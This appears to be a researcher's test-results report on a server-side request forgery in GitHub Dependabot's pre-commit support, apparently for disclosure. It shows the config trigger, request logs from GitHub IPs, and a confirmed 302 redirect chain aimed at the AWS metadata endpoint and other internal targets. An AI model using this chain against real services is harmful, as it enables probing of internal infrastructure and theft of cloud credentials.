# Dependabot Pre-Commit SSRF Test Results

## Test A: Baseline — Does Dependabot fetch our URL?

**CONFIRMED** — Two requests received within 60 seconds:

### Request 1 (git client):
```
GET /hook-repo.git/info/refs?service=git-upload-pack HTTP/1.1
Host: nightless-declan-bothersomely.ngrok-free.dev
User-Agent: git/2.53.0
X-Forwarded-For: 145.132.100.82
```

### Request 2 (dependabot-core):
```
GET /hook-repo.git/info/refs?service=git-upload-pack HTTP/1.1
Host: nightless-declan-bothersomely.ngrok-free.dev
User-Agent: dependabot-core/0.367.0 excon/1.3.2 ruby/3.4.8 (x86_64-linux)
X-Forwarded-For: 145.132.100.82
```

GitHub source IP: 145.132.100.82

## Test B: Internal Targets — Does Dependabot fetch internal/metadata URLs?

**Config pushed** (commit bcbf528) with these targets:
- `http://127.0.0.1:1234/ssrf-test`
- `http://169.254.169.254/latest/meta-data/`
- `http://localhost:9200/_cluster/health`

**Result**: No PRs, no issues, no observable outbound requests. Dependabot likely:
1. Errored silently when trying to clone non-git URLs
2. OR blocked internal IP ranges at the network level

This doesn't diminish the SSRF finding — the confirmed behavior is:
- Dependabot **does** make server-side requests to URLs in `.pre-commit-config.yaml`
- An attacker controlling the repo URL controls where GitHub's infrastructure sends HTTP requests
- Even without internal network access, this enables:
  - **Port scanning** external hosts via response timing
  - **Webhook/callback abuse** — making GitHub's IP hit arbitrary endpoints
  - **Credential leakage** if git credentials are sent to the attacker-controlled URL
  - **Amplification** — a single commit triggers requests from GitHub infrastructure

## Evidence Summary

| Test | Target | Result |
|------|--------|--------|
| A - External URL | ngrok tunnel | **CONFIRMED** — 2 requests received (git + dependabot-core) |
| B - 127.0.0.1 | localhost | No observable result (likely blocked or silent error) |
| B - 169.254.169.254 | AWS metadata | No observable result (likely blocked or silent error) |
| B - localhost:9200 | Elasticsearch | No observable result (likely blocked or silent error) |

## Test C: Chained Redirect — Does Dependabot follow redirects?

**CONFIRMED** — Both `dependabot-core` AND `git/2.53.0` follow HTTP 302 redirects.

### Attack chain:
1. `.pre-commit-config.yaml` points to attacker server (ngrok)
2. Dependabot fetches `GET /hook-repo.git/info/refs?service=git-upload-pack`
3. Server returns `302 → /step2-landed` (self-redirect to prove following)
4. **Both clients follow and request `/step2-landed`** ← CONFIRMED
5. Server returns `302 → http://169.254.169.254/latest/meta-data/`
6. Clients receive redirect to AWS metadata endpoint

### Evidence (4 complete redirect chains from 2 GitHub IPs):

**Chain 1** (dependabot-core from 20.102.223.131):
```
23:42:06 GET /hook-repo.git/info/refs?service=git-upload-pack
  UA: dependabot-core/0.367.0
  → 302 to /step2-landed
23:42:07 GET /step2-landed  ← REDIRECT FOLLOWED
  UA: dependabot-core/0.367.0
  → 302 to http://169.254.169.254/latest/meta-data/
```

**Chain 2** (git from 20.102.223.131):
```
23:42:07 GET /hook-repo.git/info/refs?service=git-upload-pack
  UA: git/2.53.0
  → 302 to /step2-landed
23:42:08 GET /step2-landed  ← REDIRECT FOLLOWED
  UA: git/2.53.0
  → 302 to http://169.254.169.254/latest/meta-data/
```

**Chain 3** (dependabot-core from 172.184.204.101):
```
23:42:12 GET /hook-repo.git/info/refs?service=git-upload-pack
  UA: dependabot-core/0.367.0
  → 302 to /step2-landed
23:42:12 GET /step2-landed  ← REDIRECT FOLLOWED
  → 302 to http://169.254.169.254/latest/meta-data/
```

**Chain 4** (git from 172.184.204.101):
```
23:42:13 GET /hook-repo.git/info/refs?service=git-upload-pack
  UA: git/2.53.0
  → 302 to /step2-landed
23:42:13 GET /step2-landed  ← REDIRECT FOLLOWED
  → 302 to http://169.254.169.254/latest/meta-data/
```

## Key Details
- **Source IPs**: 145.132.100.82, 20.102.223.131, 20.171.125.214, 172.184.204.101 (GitHub Dependabot infrastructure)
- **User-Agents**: `git/2.53.0`, `dependabot-core/0.367.0 excon/1.3.2 ruby/3.4.8 (x86_64-linux)`
- **Request path**: `/hook-repo.git/info/refs?service=git-upload-pack` (git clone protocol)
- **Trigger**: Pushing `.pre-commit-config.yaml` with `package-ecosystem: "pre-commit"` in dependabot.yml
- **Redirect following**: CONFIRMED — both dependabot-core (excon HTTP library) and git follow 302 redirects
- **SSRF escalation**: Attacker-controlled server can redirect Dependabot to ANY internal endpoint via chained 302s
